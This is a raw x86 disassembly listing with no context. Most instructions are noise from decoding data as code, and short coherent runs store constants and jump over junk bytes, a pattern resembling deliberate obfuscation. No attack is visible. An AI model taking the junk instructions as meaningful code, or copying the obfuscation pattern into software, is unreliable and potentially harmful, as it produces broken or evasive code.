  417f39:	adc    DWORD PTR [esi+edx*4-0x55],0x6d2455dc
  417f41:	lock jbe 0x417edf
  417f44:	mov    ch,0xa0
  417f46:	cmp    DWORD PTR [esi-0x48da3d83],esi
  417f4c:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  417f4e:	push   ecx
  417f4f:	mov    bl,BYTE PTR cs:[edi]
  417f52:	mov    esp,0x2ba87d50
  417f57:	retf   
  417f58:	int    0x7d
  417f5a:	lea    eax,[ebp+0x27]
  417f5d:	out    0x83,al
  417f5f:	lock and bl,BYTE PTR [ecx]
  417f62:	rcl    DWORD PTR [esi+edx*8],0xae
  417f66:	mov    bl,BYTE PTR ds:0xef204880
  417f6c:	mov    esi,0x7da52159
  417f71:	inc    esi
  417f72:	sbb    BYTE PTR [eax],0x8d
  417f75:	aaa    
  417f76:	mov    ebx,0xa5762383
  417f7b:	and    edi,esp
  417f7d:	daa    
  417f7e:	bound  eax,QWORD PTR [edx]
  417f80:	adc    edi,DWORD PTR [ecx-0x6f]
  417f83:	inc    esi
  417f84:	mov    cl,0xfc
  417f86:	fwait
  417f87:	cmp    ebx,DWORD PTR [ebx-0x17]
  417f8a:	sti    
  417f8b:	imul   ecx,esi,0xffffffa8
  417f8e:	adc    dl,al
  417f90:	jne    0x417fdc
  417f92:	mov    ebx,0x59cffa8e
  417f97:	frstor [ebp-0x5604106b]
  417f9d:	ds lahf 
  417f9f:	jne    0x417ff2
  417fa1:	test   al,0xaa
  417fa3:	mov    DWORD PTR [ebp-0x48],0x637e
  417faa:	mov    DWORD PTR [ebp-0x44],0x43fc
  417fb1:	mov    DWORD PTR [ebp-0x40],0x3bc2
  417fb8:	mov    DWORD PTR [ebp-0x3c],0x14f9
  417fbf:	mov    DWORD PTR [ebp-0xc],0x233f
  417fc6:	mov    DWORD PTR [ebp-0x8],0x421c
  417fcd:	mov    DWORD PTR [ebp-0x4],0x3361
  417fd4:	mov    DWORD PTR [ebp-0x1c],0x9db
  417fdb:	mov    DWORD PTR [ebp-0x18],0x7
  417fe2:	mov    DWORD PTR [ebp-0x14],0x2a24
  417fe9:	mov    DWORD PTR [ebp-0x10],0x6fd8
  417ff0:	mov    DWORD PTR [ebp-0x24],0x5218
  417ff7:	jmp    0x4180c6
  417ffc:	clc    
  417ffd:	repz pop ecx
  417fff:	stc    
  418000:	pop    ebx
  418001:	sti    
  418002:	clc    
  418003:	repz into 
  418005:	xchg   ebp,eax
  418006:	lock addr16 (bad) 
  418009:	into   
  41800a:	add    cl,BYTE PTR ds:0x111d1
  418010:	mov    dl,0x0
  418012:	add    BYTE PTR [eax],al
  418014:	(bad)  
  418015:	xchg   edx,eax
  418016:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418017:	pop    ds
  418018:	push   0xe454821e
  41801d:	xchg   esi,eax
  41801e:	add    al,0xd5
  418020:	repnz test eax,0xed892de3
  418026:	sub    DWORD PTR [esi],edx
  418028:	dec    esp
  418029:	jo     0x41809f
  41802b:	push   ecx
  41802c:	add    ebx,DWORD PTR [ebp+edi*1+0x52]
  418030:	mov    bh,0xc7
  418032:	pop    ss
  418033:	mov    ebp,0xc1443494
  418038:	sub    DWORD PTR [ebx+0x49],eax
  41803b:	cdq    
  41803c:	pop    esi
  41803d:	mov    cs,eax
  41803f:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  418041:	repnz popf 
  418043:	iret   
  418044:	gs scas eax,DWORD PTR es:[edi]
  418046:	jg     0x4180c5
  418048:	push   ss
  418049:	test   BYTE PTR [esi+0x68548771],cl
  41804f:	sub    BYTE PTR [ecx],dh
  418051:	mov    ds:0xfe0b0337,eax
  418056:	(bad)  
  418057:	cmp    ecx,DWORD PTR [ecx-0xe]
  41805a:	in     al,0x43
  41805c:	aaa    
  41805d:	out    dx,al
  41805e:	pop    ebp
  41805f:	jp     0x418058
  418061:	sub    eax,0x1737c32f
  418066:	pslld  mm3,mm5
  418069:	mov    eax,0x799cbb3d
  41806e:	fst    QWORD PTR [esi-0x52daf113]
  418074:	xor    eax,0x88969b63
  418079:	or     al,cl
  41807b:	add    eax,0x9269fc9b
  418080:	leave  
  418081:	lods   eax,DWORD PTR ds:[esi]
  418082:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418083:	lds    eax,FWORD PTR [esi]
  418085:	cmp    edi,0x2d
  418088:	inc    edi
  418089:	xchg   esp,eax
  41808a:	and    ebx,DWORD PTR [edi-0x4ce5417d]
  418090:	(bad)  
  418091:	sar    BYTE PTR [edx-0x56a9700f],cl
  418097:	jno    0x4180fe
  418099:	loopne 0x4180e8
  41809b:	push   0x1500f6a6
  4180a0:	or     ebx,esp
  4180a2:	not    BYTE PTR ds:[edi]
  4180a5:	dec    esp
  4180a6:	push   0x75
  4180a8:	aad    0x73
  4180aa:	inc    ebp
  4180ab:	add    al,0xe9
  4180ad:	xor    cl,BYTE PTR [eax]
  4180af:	or     esi,DWORD PTR fs:[edx+0x44]
  4180b3:	test   esp,ecx
  4180b5:	dec    ecx
  4180b6:	or     DWORD PTR ds:0x751e9aaa,edi
  4180bc:	out    dx,al
  4180bd:	ror    DWORD PTR [ebp+0x41],1
  4180c0:	icebp  
  4180c1:	sbb    BYTE PTR [edx],dh
  4180c3:	sar    edx,1
  4180c5:	jo     0x41808e
  4180c7:	inc    ebp
  4180c8:	fsub   DWORD PTR [esi+0x6d]
  4180cb:	add    BYTE PTR [eax],al
  4180cd:	mov    DWORD PTR [ebp-0x20],0x3469
  4180d4:	mov    DWORD PTR [ebp-0x78],0x5654
  4180db:	jmp    0x4181aa
  4180e0:	cmp    DWORD PTR [esi],eax
  4180e2:	mov    al,ds:0xffffbf7f
  4180e7:	inc    esi
  4180e8:	(bad)  
  4180e9:	xor    dh,BYTE PTR [ecx-0x61]
  4180ec:	push   es
  4180ed:	xchg   esp,eax
  4180ee:	pop    ebx
  4180ef:	dec    esi
  4180f0:	adc    DWORD PTR [edx],0x1
  4180f3:	add    BYTE PTR [edx+0x42000000],dh
  4180f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180fa:	mov    edx,0xa53d79d5
  4180ff:	(bad)
  418102:	mov    ch,0x4
  418104:	add    al,dl
  418106:	scas   al,BYTE PTR es:[edi]
  418107:	rcr    ah,1
  418109:	ds ins BYTE PTR es:[edi],dx
  41810b:	push   es
  41810c:	fsubrp st(5),st
  41810e:	mov    BYTE PTR es:[eax],cl
  418111:	adc    ch,0xa2
  418114:	ss mov al,0xb3
  418117:	lock dec edx
  418119:	pop    edi
  41811a:	jne    0x4180c2
  41811c:	ss stos DWORD PTR es:[edi],eax
  41811e:	cld    
  41811f:	lods   eax,DWORD PTR ds:[esi]
  418120:	sbb    DWORD PTR [ebp-0x7930b22],edi
  418126:	test   ebp,ebp
  418128:	mov    al,0x6a
  41812a:	mov    bh,0xa1
  41812c:	pop    es
  41812d:	cli    
  41812e:	push   ebp
  41812f:	mov    eax,0xf08b4677
  418134:	xlat   BYTE PTR ds:[ebx]
  418135:	leave  
  418136:	cmp    BYTE PTR [eax],dh
  418138:	xor    edx,DWORD PTR [edi-0x2521cf5f]
  41813e:	jg     0x418120
  418140:	sbb    DWORD PTR [ebp-0x6a],edi
  418143:	adc    bh,cl
  418145:	dec    esi
  418146:	cli    
  418147:	pop    ecx
  418148:	jne    0x4181c5
  41814a:	rcl    dh,0x89
  41814d:	inc    eax
  41814e:	xlat   BYTE PTR ds:[ebx]
  41814f:	out    0xb2,al
  418151:	lds    esi,FWORD PTR ds:0xfe3cd932
  418157:	lahf   
  418158:	add    al,0x6b
  41815a:	retf   0x3e2f
  41815d:	addr16 xchg ecx,eax
  41815f:	cmc    
  418160:	shr    cl,0xaf
  418163:	push   edx
  418164:	jp     0x41815f
  418166:	jp     0x4180e8
  418168:	or     eax,0xb82d1f52
  41816d:	rol    BYTE PTR [edi+0xeb02f1b],0xfd
  418174:	enter  0xbe34,0x63
  418178:	imul   BYTE PTR [ebx+0x74cc366c]
  41817e:	push   ds
  41817f:	mov    ebp,0xfee10432
  418184:	aas    
  418185:	push   0x32
  418187:	and    BYTE PTR [ecx],bl
  418189:	ror    DWORD PTR [ebp+ebx*1-0xfb0037a],1
  418190:	leave  
  418191:	cmp    BYTE PTR [ecx+0x2c45ba03],0xf
  418198:	iret   
  418199:	(bad)  
  41819a:	dec    eax
  41819b:	cmp    ch,BYTE PTR [edi+0x21]
  41819e:	mov    ebx,eax
  4181a0:	es mov edx,0xda5ae4b4
  4181a6:	ret    
  4181a7:	fiadd  DWORD PTR [eax]
  4181a9:	pop    ebx
  4181aa:	mov    DWORD PTR [ebp-0x74],0x1ca1
  4181b1:	mov    DWORD PTR [ebp-0x70],0x5a50
  4181b8:	jmp    0x418287
  4181bd:	rol    DWORD PTR [edx],0xac
  4181c0:	jne    0x4181b1
  4181c2:	(bad)  
  4181c3:	fnstenv [esi+0x3fead990]
  4181c9:	mov    ebx,DWORD PTR [ecx+0x1335c35d]
  4181cf:	add    DWORD PTR [eax],eax
  4181d1:	mov    dl,0x0
  4181d3:	add    BYTE PTR [eax],al
  4181d5:	jno    0x4181f3
  4181d7:	outs   dx,BYTE PTR ds:[esi]
  4181d8:	fstp   TBYTE PTR [eax]
  4181da:	jge    0x41817c
  4181dc:	jle    0x76e53c3c
  4181e2:	push   0xe7775658
  4181e7:	aaa    
  4181e8:	in     eax,dx
  4181e9:	cmp    cl,BYTE PTR [esi]
  4181eb:	rol    bh,1
  4181ed:	pop    edi
  4181ee:	jo     0x418217
  4181f0:	lods   al,BYTE PTR ds:[esi]
  4181f1:	ss ins BYTE PTR es:[edi],dx
  4181f3:	sahf   
  4181f4:	push   eax
  4181f5:	dec    esp
  4181f6:	xor    DWORD PTR [edx+0x36d2c53a],ebp
  4181fc:	sub    DWORD PTR [eax],edx
  4181fe:	mov    WORD PTR [esi],?
  418200:	fcomp  st(6)
  418202:	lods   eax,DWORD PTR ds:[esi]
  418203:	(bad)
  418206:	sar    BYTE PTR [esi],1
  418208:	js     0x41826b
  41820a:	(bad)
  41820e:	jo     0x418267
  418210:	jge    0x418256
  418212:	inc    esp
  418213:	xor    al,0xa9
  418215:	adc    al,0xab
  418217:	inc    ebx
  418218:	das    
  418219:	add    al,0x76
  41821b:	mov    esp,0x96e63c5
  418220:	mov    al,ds:0x19458513
  418225:	addr16 pop edi
  418227:	push   0x2127206f
  41822c:	test   eax,0xed94eddb
  418231:	mov    WORD PTR ds:0x85f0e1e,cs
  418237:	(bad)  
  418238:	fisubr DWORD PTR [edi+edi*2+0x3a1067d9]
  41823f:	loope  0x4182ae
  418241:	xchg   esp,eax
  418242:	ret    
  418243:	cdq    
  418244:	stos   BYTE PTR es:[edi],al
  418245:	imul   esi,ebx,0x4a18d1eb
  41824b:	lods   al,BYTE PTR ds:[esi]
  41824c:	mov    bl,0x32
  41824e:	adc    BYTE PTR [ebp-0x27],bl
  418251:	repz sub edx,DWORD PTR [ecx-0x19]
  418255:	mov    WORD PTR [ecx+eiz*4+0x2523a735],?
  41825c:	in     eax,dx
  41825d:	pop    ds
  41825e:	(bad)  
  41825f:	(bad)  
  418261:	adc    DWORD PTR [edx+0x40712bad],esp
  418267:	adc    edx,ebx
  418269:	frstor [esi-0x2c]
  41826c:	test   eax,0xbb3fc311
  418271:	add    DWORD PTR [edx],ecx
  418273:	and    DWORD PTR [ecx-0x4a],eax
  418276:	(bad)  
  418277:	jo     0x418259
  418279:	dec    edi
  41827a:	inc    edx
  41827b:	or     esi,DWORD PTR [ebx]
  41827d:	cmp    ebx,esi
  41827f:	mov    al,0x8f
  418281:	mov    bl,0xc2
  418283:	mov    al,ds:0xc7853f8e
  418288:	inc    ebp
  418289:	xchg   esp,eax
  41828a:	imul   esp,DWORD PTR [edi],0xcae90000
  418290:	add    BYTE PTR [eax],al
  418292:	add    BYTE PTR [esi-0x300af4a7],bl
  418298:	idiv   esi
  41829a:	jnp    0x418222
  41829c:	lea    eax,ds:0x2f814738
  4182a2:	in     al,0xe7
  4182a4:	adc    eax,DWORD PTR [ecx]
  4182a6:	add    BYTE PTR [edx-0x5000000],dh
  4182ac:	cmp    al,0x89
  4182ae:	cld    
  4182af:	dec    ebx
  4182b0:	ins    BYTE PTR es:[edi],dx
  4182b1:	mov    edx,0x8e711313
  4182b6:	mov    ecx,0x51e0e9c8
  4182bb:	ret    
  4182bc:	fcom   QWORD PTR [edi]
  4182be:	(bad)  
  4182bf:	cld    
  4182c0:	test   al,0x56
  4182c2:	mov    edx,0x8f3fa4e0
  4182c7:	iret   
  4182c8:	add    edi,ebx
  4182ca:	adc    DWORD PTR [edi-0x3a],edi
  4182cd:	retf   0xa10c
  4182d0:	ins    DWORD PTR es:[edi],dx
  4182d1:	jae    0x418342
  4182d3:	cmp    BYTE PTR [ecx-0x27],al
  4182d6:	xor    al,0x80
  4182d8:	js     0x418301
  4182da:	(bad)
  4182dd:	repnz add ch,bl
  4182e0:	inc    edi
  4182e1:	mov    esi,0xbeb25588
  4182e6:	not    eax
  4182e8:	push   esp
  4182e9:	inc    ecx
  4182ea:	mov    ds:0x51eb5a63,al
  4182ef:	test   DWORD PTR ds:0xf720420b,ecx
  4182f5:	lea    ebp,[esi]
  4182f7:	jo     0x41827c
  4182f9:	nop
  4182fa:	xchg   esp,eax
  4182fb:	dec    ebx
  4182fc:	les    eax,FWORD PTR [esi-0x6b]
  4182ff:	cmp    eax,0xfd30d493
  418304:	sar    DWORD PTR [ebx+ebp*1+0x5ffb521c],cl
  41830b:	cmp    al,0x94
  41830d:	jmp    0x625155d4
  418312:	(bad)  
  418313:	jmp    0x418344
  418315:	jne    0x418382
  418317:	mov    WORD PTR [eax+0x2a8517e6],ss
  41831d:	push   edx
  41831e:	push   ds
  41831f:	xor    bh,BYTE PTR [ebx+0x54]
  418322:	xchg   dh,dh
  418324:	pop    edx
  418325:	fild   QWORD PTR [esi]
  418327:	xor    DWORD PTR [ecx],0x398325dc
  41832d:	mov    eax,ds:0x3df340e5
  418332:	or     al,BYTE PTR [ebx]
  418334:	or     al,BYTE PTR [ecx]
  418336:	leave  
  418337:	into   
  418338:	enter  0xca83,0x2c
  41833c:	lds    ecx,FWORD PTR [ecx]
  41833e:	fadd   st(2),st
  418340:	pop    edi
  418341:	ror    DWORD PTR [edx+0x7f4cb1e8],cl
  418347:	fisttp DWORD PTR [esi]
  418349:	push   edi
  41834a:	cmc    
  41834b:	sbb    bh,BYTE PTR [esp+eiz*2-0x12d16c33]
  418352:	xlat   BYTE PTR ds:[ebx]
  418353:	sti    
  418354:	add    DWORD PTR [ecx],0x2fbaacb2
  41835a:	enter  0xd954,0xc7
  41835e:	inc    ebp
  41835f:	cwde   
  418360:	call   0x9c45:0xc7000026
  418367:	adc    ecx,DWORD PTR [eax+0x0]
  41836a:	add    cl,ch
  41836c:	retf   0x0
  41836f:	add    BYTE PTR [esi+ecx*4],bh
  418372:	into   
  418373:	data16 (bad) 
  418375:	mov    sp,0xd8de
  418379:	sbb    dh,dh
  41837b:	adc    DWORD PTR ds:0x990df104,esi
  418381:	adc    al,0x1
  418383:	add    BYTE PTR [edx+0x40000000],dh
  418389:	jmp    0x418398
  41838b:	shl    DWORD PTR [esi+ebx*2],1
  41838e:	in     eax,dx
  41838f:	pop    ebp
  418390:	ror    BYTE PTR [eax-0x2],cl
  418393:	add    DWORD PTR [edi-0x4f],ecx
  418396:	call   0xe083:0x19aea5bb
  41839d:	jp     0x4183ec
  41839f:	dec    ebp
  4183a0:	mov    ah,0x46
  4183a2:	push   ds
  4183a3:	push   es
  4183a4:	mov    ch,0x30
  4183a6:	push   es
  4183a7:	cmp    esp,edi
  4183a9:	sbb    eax,0x78a2f156
  4183ae:	and    eax,0x15d6ab67
  4183b3:	mov    cl,BYTE PTR [edi+0x4dd9b341]
  4183b9:	cmc    
  4183ba:	(bad)  
  4183bb:	xchg   ebx,eax
  4183bc:	dec    ecx
  4183bd:	cdq    
  4183be:	mov    dl,0xe9
  4183c0:	xlat   BYTE PTR ds:[ebx]
  4183c1:	adc    eax,0x1d3ee826
  4183c6:	xchg   ebp,eax
  4183c7:	aas    
  4183c8:	mov    edx,0x75da090e
  4183cd:	add    eax,DWORD PTR [eax]
  4183cf:	fwait
  4183d0:	mov    eax,0xcf3e56fe
  4183d5:	jmp    0x9238a80a
  4183da:	out    0x19,eax
  4183dc:	ret    0x5635
  4183df:	outs   dx,DWORD PTR ds:[esi]
  4183e0:	dec    esi
  4183e1:	rol    BYTE PTR [edx],1
  4183e3:	xor    dl,BYTE PTR fs:[ecx+0x59]
  4183e7:	(bad)  
  4183e8:	jb     0x418414
  4183ea:	dec    esp
  4183eb:	mov    ebp,0x70296a60
  4183f0:	scas   eax,DWORD PTR es:[edi]
  4183f1:	mov    al,ds:0x608101a4
  4183f6:	repz ds or al,0xb9
  4183fa:	sub    al,0x57
  4183fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183fd:	mov    ds:0x4b27bb8e,eax
  418402:	push   esi
  418403:	ins    DWORD PTR es:[edi],dx
  418404:	nop
  418405:	js     0x418428
  418407:	cld    
  418408:	inc    ecx
  418409:	pop    ss
  41840a:	xchg   edi,eax
  41840b:	in     al,dx
  41840c:	pop    ss
  41840d:	(bad)  
  41840e:	(bad)  
  41840f:	nop
  418410:	mov    al,0xb4
  418412:	add    eax,0xf7668372
  418417:	sub    eax,0x2abdf1c
  41841c:	add    ecx,DWORD PTR [edi]
  41841e:	xor    edx,DWORD PTR [eax+edi*8-0xd]
  418422:	shl    DWORD PTR [edx],1
  418424:	push   ecx
  418425:	pop    esi
  418426:	adc    edx,ebp
  418428:	addr16 nop
  41842a:	imul   edi,DWORD PTR ds:0xe1423757,0x3b
  418431:	xor    esi,DWORD PTR [ecx+0x34980679]
  418437:	sbb    esp,esp
  418439:	popf   
  41843a:	mov    DWORD PTR [ebp-0x34],0x131f
  418441:	mov    DWORD PTR [ebp-0x30],0x3a73c
  418448:	mov    DWORD PTR [ebp-0x2c],0x27ca
  41844f:	mov    ecx,DWORD PTR [ebp-0x40]
  418452:	mov    esi,DWORD PTR [ebp-0x3c]
  418455:	mov    eax,DWORD PTR [ebp-0x48]
  418458:	mov    edx,DWORD PTR [ebp-0x44]
  41845b:	add    ecx,0xffffa9e2
  418461:	adc    esi,0xfffffe95
  418467:	jmp    0x418536
  41846c:	mov    ds:0xed2f8cc6,eax
  418471:	outs   dx,DWORD PTR ds:[esi]
  418472:	mov    ds:0x595df7ce,eax
  418477:	fmulp  st(5),st
  418479:	sbb    dl,BYTE PTR [eax+0x70]
  41847c:	dec    ebx
  41847d:	adc    eax,0xb20001
  418482:	add    BYTE PTR [eax],al
  418484:	and    edi,0xf0f8ceb2
  41848a:	in     al,dx
  41848b:	repnz sub al,0xaa
  41848e:	ds hlt 
  418490:	stc    
  418491:	arpl   WORD PTR [ecx-0x69],di
  418494:	pop    ebp
  418495:	js     0x418443
  418497:	fidivr WORD PTR [edx-0x2a]
  41849a:	leave  
  41849b:	scas   eax,DWORD PTR es:[edi]
  41849c:	(bad)  
  41849d:	sbb    al,0xae
  41849f:	push   cs
  4184a0:	inc    ebp
  4184a1:	jb     0x418429
  4184a3:	xor    edi,DWORD PTR [ebx-0x703c0f8a]
  4184a9:	push   ebx
  4184aa:	mov    bh,0xf5
  4184ac:	fidiv  WORD PTR [edi]
  4184ae:	inc    esp
  4184af:	pushf  
  4184b0:	xor    eax,0x210384b5
  4184b5:	xor    DWORD PTR [edx+0x1],0x2b848b83
  4184bc:	stos   DWORD PTR es:[edi],eax
  4184bd:	lock jle 0x4184b2
  4184c0:	sbb    BYTE PTR [edx],al
  4184c2:	xchg   esp,eax
  4184c3:	inc    edi
  4184c4:	mov    esp,DWORD PTR [edx+0x72]
  4184c7:	push   es
  4184c8:	vpsllq ymm7,ymm5,xmm3
  4184cc:	jb     0x4184f1
  4184ce:	mov    al,ds:0x534b7baa
  4184d3:	mov    dl,0x95
  4184d5:	add    cl,cl
  4184d7:	sub    DWORD PTR [ebx+0x1abb01f6],0x6ee603d2
  4184e1:	imul   ebx,DWORD PTR [ebx-0x13298dfb],0x5f
  4184e8:	loope  0x41855b
  4184ea:	ds loope 0x4184f0
  4184ed:	rcl    DWORD PTR [ebx-0x30],cl
  4184f0:	and    DWORD PTR [ebp+0x13792856],edx
  4184f6:	xchg   BYTE PTR [esi+0x24e0a961],ch
  4184fc:	dec    ebx
  4184fd:	jbe    0x4184bf
  4184ff:	in     al,dx
  418500:	pause  
  418502:	call   0xb4768abb
  418507:	xchg   ebx,eax
  418508:	mov    eax,0x97a05e8c
  41850d:	fld    DWORD PTR [esi+0x6ac1202c]
  418513:	xchg   DWORD PTR [esi],ecx
  418515:	(bad)  
  418517:	ss repnz xchg edi,eax
  41851a:	in     al,0x7c
  41851c:	and    BYTE PTR fs:[eax],dl
  41851f:	leave  
  418520:	test   al,0xb1
  418522:	push   eax
  418523:	popf   
  418524:	js     0x4184fc
  418526:	push   eax
  418527:	popf   
  418528:	xchg   ebx,edi
  41852a:	test   al,0x6f
  41852c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41852d:	sub    ch,al
  41852f:	loope  0x418524
  418531:	jmp    DWORD PTR [eax]
  418533:	jmp    0x41856d
  418535:	push   ecx
  418536:	and    ecx,eax
  418538:	jmp    0x418607
  41853d:	aas    
  41853e:	dec    esi
  41853f:	out    dx,eax
  418540:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418541:	jmp    DWORD PTR [ebp+0x19cddf7f]
  418547:	cmp    BYTE PTR [edi+0x4ea0a4be],0xfd
  41854e:	adc    eax,0xb20001
  418553:	add    BYTE PTR [eax],al
  418555:	inc    ecx
  418556:	dec    ebp
  418557:	or     dl,bh
  418559:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41855a:	pop    ecx
  41855b:	pop    esi
  41855c:	addr16 pusha 
  41855e:	sbb    eax,0xaf06b032
  418563:	arpl   WORD PTR [ebx-0x5e87329e],dx
  418569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41856a:	ds cwde 
  41856c:	test   al,0x54
  41856e:	mov    ebp,0xc1a5e878
  418573:	mov    esp,0x562547
  418578:	into   
  418579:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41857a:	mov    edx,0x24063796
  41857f:	int3   
  418580:	push   esi
  418581:	push   ecx
  418582:	iret   
  418583:	loope  0x418513
  418585:	mov    esi,0x54d152f8
  41858a:	lock shld ebx,ebp,0x71
  41858f:	psubusb mm3,QWORD PTR [ebp+0x50]
  418593:	mov    bl,0xaf
  418595:	push   ecx
  418596:	mov    cl,0x61
  418598:	sbb    al,0xed
  41859a:	jmp    0x9d53:0xfe933f28
  4185a1:	mov    ecx,0x65712869
  4185a6:	inc    ebp
  4185a7:	scas   eax,DWORD PTR es:[edi]
  4185a8:	std    
  4185a9:	jmp    0xd13a:0xf0a3f85c
  4185b0:	adc    edx,DWORD PTR [esi+ecx*8-0x6e]
  4185b4:	add    esi,DWORD PTR es:[ebx+0x36]
  4185b8:	sub    DWORD PTR [edi-0x63],edx
  4185bb:	xor    esp,edx
  4185bd:	(bad)  
  4185be:	cmp    cl,BYTE PTR [ebp-0x55]
  4185c1:	jae    0x4185c3
  4185c3:	int    0xb8
  4185c5:	xchg   ebx,eax
  4185c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185c7:	pop    esp
  4185c8:	(bad)  
  4185c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185ca:	sbb    DWORD PTR [esp+edi*1],0x2a
  4185ce:	dec    ebp
  4185cf:	xchg   ecx,eax
  4185d0:	fldcw  WORD PTR [esi-0x545a2074]
  4185d6:	(bad)  
  4185d9:	xor    al,BYTE PTR ds:0xe86cdd39
  4185df:	bound  ebx,QWORD PTR [ebp+0x70958973]
  4185e5:	add    BYTE PTR [ebp-0x48],dh
  4185e8:	cmp    eax,0xe87b45ea
  4185ed:	jns    0x41865e
  4185ef:	scas   al,BYTE PTR es:[edi]
  4185f0:	hlt    
  4185f1:	adc    DWORD PTR [edi],ecx
  4185f3:	dec    ebx
  4185f4:	sub    DWORD PTR [eax-0x32],eax
  4185f7:	xchg   esi,eax
  4185f8:	cs jge 0x4185cc
  4185fb:	ins    DWORD PTR es:[edi],dx
  4185fc:	xchg   esi,eax
  4185fd:	inc    esi
  4185fe:	in     eax,dx
  4185ff:	in     al,0x4c
  418601:	xchg   edi,eax
  418602:	xor    al,0x57
  418604:	inc    edi
  418605:	mov    edi,0xb0458bb7
  41860a:	and    esi,edx
  41860c:	mov    edx,DWORD PTR [ebp-0x4c]
  41860f:	jmp    0x4186de
  418614:	push   ebx
  418615:	data16 or BYTE PTR [ebp+edi*1+0x6e],ch
  41861a:	ja     0x41869b
  41861c:	adc    ch,BYTE PTR [edx+0x58be3fc5]
  418622:	lds    edi,FWORD PTR [edi]
  418624:	scas   eax,DWORD PTR es:[edi]
  418625:	push   ss
  418626:	add    DWORD PTR [eax],eax
  418628:	mov    dl,0x0
  41862a:	add    BYTE PTR [eax],al
  41862c:	add    ebp,esi
  41862e:	dec    esi
  41862f:	scas   eax,DWORD PTR es:[edi]
  418630:	push   esp
  418631:	cmp    esp,DWORD PTR [ecx]
  418633:	mov    DWORD PTR [edi+ebp*4+0x38],edi
  418637:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418638:	fxch   st(4)
  41863a:	cwde   
  41863b:	dec    ebx
  41863c:	retf   
  41863d:	repz lds ecx,FWORD PTR es:[eax-0x781b9aef]
  418645:	out    dx,al
  418646:	bnd jne 0x418698
  418649:	sar    esp,0x6e
  41864c:	clc    
  41864d:	lahf   
  41864e:	stos   BYTE PTR es:[edi],al
  41864f:	(bad)  
  418650:	fnstcw WORD PTR [ecx-0x1bf3cdf9]
  418656:	fs and ebp,esp
  418659:	push   ecx
  41865a:	xchg   esp,eax
  41865b:	add    eax,0xcf21c9b6
  418660:	jmp    0x168c935a
  418665:	test   eax,0x56352c88
  41866a:	jg     0x4186a0
  41866c:	rcl    DWORD PTR [ebx+ecx*1-0x2d2d8a9a],1
  418673:	call   0xd4f4e4a9
  418678:	and    eax,0xb78235f7
  41867d:	mov    al,0xc0
  41867f:	out    0xf6,al
  418681:	pushf  
  418682:	xor    al,BYTE PTR [ecx+0x5d9f050a]
  418688:	mov    ch,0x2d
  41868a:	ret    
  41868b:	xor    eax,0xa6c603e0
  418690:	or     DWORD PTR [esi-0x48],esp
  418693:	add    BYTE PTR [edi],ch
  418695:	mov    ch,0x35
  418697:	fwait
  418698:	adc    DWORD PTR [edx+0x75df4fa3],ebp
  41869e:	ds fs sbb eax,0x611debf2
  4186a5:	and    BYTE PTR [eax],dl
  4186a7:	sub    cl,BYTE PTR [ecx-0x535ded38]
  4186ad:	sub    al,0x4a
  4186af:	enter  0x173,0xa5
  4186b3:	xor    eax,0xffffffa8
  4186b6:	out    dx,al
  4186b7:	loope  0x418661
  4186b9:	leave  
  4186ba:	(bad)  
  4186bc:	cmp    ebp,DWORD PTR [eax-0x51]
  4186bf:	xchg   edx,eax
  4186c0:	into   
  4186c1:	xchg   ecx,eax
  4186c2:	push   eax
  4186c3:	sbb    esp,DWORD PTR [edx]
  4186c5:	test   eax,0x7c1eb1a8
  4186ca:	jne    0x4186c7
  4186cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186cd:	je     0x4186b7
  4186cf:	imul   esp,DWORD PTR [eax-0xa],0xffffffa0
  4186d3:	push   edx
  4186d4:	jmp    0x5c62:0xad5ed573
  4186db:	and    ebp,DWORD PTR [ebp-0xa]
  4186de:	sub    ecx,eax
  4186e0:	mov    eax,ds:0x4331b4
  4186e5:	mov    eax,DWORD PTR [eax+0x1c8]
  4186eb:	mov    eax,DWORD PTR [eax]
  4186ed:	sbb    esi,edx
  4186ef:	add    ecx,0x11f5
  4186f5:	cdq    
  4186f6:	jmp    0x4187c5
  4186fb:	(bad)  
  4186fd:	shl    BYTE PTR ds:0xffff2ff0,1
  418703:	inc    edx
  418704:	cmp    ah,0xe4
  418707:	sbb    eax,0x61deea84
  41870c:	pop    ss
  41870d:	add    DWORD PTR [eax],eax
  41870f:	mov    dl,0x0
  418711:	add    BYTE PTR [eax],al
  418713:	add    esp,DWORD PTR [ebp-0x6555f6e6]
  418719:	adc    al,0xef
  41871b:	xchg   ebx,eax
  41871c:	fcmovb st,st(6)
  41871e:	outs   dx,DWORD PTR ds:[esi]
  41871f:	push   esi
  418720:	pop    esp
  418721:	bound  esi,QWORD PTR [edi]
  418723:	outs   dx,BYTE PTR ds:[esi]
  418724:	mov    ds:0x54962651,al
  418729:	outs   dx,DWORD PTR ds:[esi]
  41872a:	jle    0x4186d7
  41872c:	push   ebp
  41872d:	sub    eax,0x1b575190
  418732:	inc    ebx
  418733:	mov    al,ds:0x43d83bc
  418738:	fsubr  DWORD PTR [ebx+ebx*4-0x26e41fd5]
  41873f:	jg     0x418746
  418741:	lds    esp,FWORD PTR [esi+0x58]
  418744:	out    dx,al
  418745:	mov    fs,WORD PTR [edx]
  418747:	in     al,dx
  418748:	shl    BYTE PTR [esi+0x670544d1],1
  41874e:	jp     0x41878b
  418750:	mov    ds:0x1ddfa01d,eax
  418755:	inc    edi
  418756:	push   edi
  418757:	jmp    0x4187b3
  418759:	gs jmp 0x1ecb:0xf0cfde15
  418761:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418762:	mov    dh,0xf1
  418764:	dec    edi
  418765:	or     edi,esi
  418767:	adc    ebp,DWORD PTR [edx+0x62]
  41876a:	or     dh,BYTE PTR [edi-0x7b]
  41876d:	jp     0x418748
